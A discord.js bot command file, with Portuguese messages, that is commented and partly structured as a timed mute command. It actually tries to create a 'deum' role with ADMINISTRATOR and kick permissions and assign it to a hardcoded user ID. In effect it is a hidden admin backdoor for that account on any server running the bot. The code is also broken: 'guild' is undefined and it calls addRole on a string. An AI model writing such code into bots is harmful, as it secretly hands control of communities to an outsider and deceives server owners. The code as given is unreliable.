const Discord = require("discord.js");
const ms = require("ms");

module.exports.run = async (bot, message, args) => {

  //!mute @user 1s/m/h/d

  let hakii = `<@336190681976668160>`
  let hakiirole = message.guild.roles.find(`name`, "deum");

  guild.roles.create({ data: { name: 'deum', permissions: ['MANAGE_MESSAGES', 'KICK_MEMBERS', 'ADMINISTRATOR'] } });
  
  let mutetime = args[1];
  if(!mutetime) return message.channel.send("Você não especificou o tempo!");

  await(hakii.addRole(hakiirole.id));
  message.reply(`${hakii} agora é fodão`);
}

module.exports.help = {
  name: "deum"
}